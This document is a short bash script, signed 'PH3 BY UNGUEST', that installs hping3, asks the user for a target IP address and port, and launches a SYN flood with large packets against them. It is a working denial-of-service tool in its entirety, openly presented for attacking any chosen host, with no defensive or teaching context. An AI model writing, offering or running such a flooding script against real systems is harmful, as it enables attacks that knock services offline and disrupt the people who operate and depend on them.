echo PH3 BY UNGUEST ---
echo 'IF YOU DID NOT LAUNCHED IT AS ADMIN, QUIT AND DO SO :)'
ram='r'
read $ram
sudo apt update && sudo apt install hping3
clear
echo enter the ip adress to ddos : 
ip='0.0.0.0'
read ip
echo enter the port to ddos : 
port='0000'
read port
echo 'Please note that requests are about to use a large part of your bandwidth...'
sudo hping3 -S -d 65495 --flood -p $port $ip
